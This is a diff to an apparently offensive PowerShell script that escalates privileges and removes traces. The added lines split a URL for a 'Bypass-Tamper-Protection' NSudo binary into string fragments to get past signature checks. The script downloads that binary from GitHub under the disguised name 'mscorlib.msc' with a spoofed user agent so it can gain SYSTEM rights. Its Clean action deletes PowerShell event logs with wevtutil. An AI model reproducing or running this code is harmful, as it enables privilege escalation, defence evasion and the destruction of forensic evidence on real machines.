@@ -204,8 +204,9 @@ If($Action -ieq "Elevate"){
       Write-Host "`n`n[admin] Elevating privileges to NT AUTHORITY\SYSTEM!`n" -ForeGroundColor Yellow
    
       ## Download and masquerade the required standalone executable
+      $Colombo = "Bypas" + "s-Tamper-Pro" + "tection/main/NSudo" -join ''
       If(-not(Test-Path -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue)){
-         iwr -Uri https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe -OutFile $Env:TMP\mscorlib.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
+         iwr -Uri https://raw.githubusercontent.com/swagkarna/${Colombo}.exe -OutFile $Env:TMP\mscorlib.msc -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
       }
 
       If(-not(Test-Path -Path "$Env:TMP\mscorlib.msc" -EA SilentlyContinue)){
@@ -524,15 +525,6 @@ If($Action -ieq "Clean"){
    $IsClientAdmin = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
    If($IsClientAdmin){## Clean related eventvwr logfiles
 
-      $CleanPSo = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
-         $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
-
-      If($CleanPSo -gt 0){## Delete ALL Powershell LogFiles
-         Write-Host "Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
-         wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
-         $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!
-      }
-
       $CleanWPS = (wevtutil gli "Windows Powershell" | Where-Object { 
          $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
 
@@ -540,6 +532,15 @@ If($Action -ieq "Clean"){
          Write-Host "Eventvwr Windows Powershell Logs Deleted!" -ForeGroundColor Yellow
          wevtutil cl "Windows Powershell" | Out-Null
          $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!         
+      }
+
+      $CleanPSo = (wevtutil gli "Microsoft-Windows-Powershell/Operational" | Where-Object { 
+         $_ -Match 'numberOfLogRecords:' }).split(':')[1] -replace ' ',''
+
+      If($CleanPSo -gt 0){## Delete ALL Powershell LogFiles
+         Write-Host "Eventvwr Powershell/Operational Logs Deleted!" -ForeGroundColor Yellow
+         wevtutil cl "Microsoft-Windows-Powershell/Operational" | Out-Null
+         $PowershellLogs = $PowershellLogs+1 ## Count how many artifacts are cleanned!
       }
 
    }
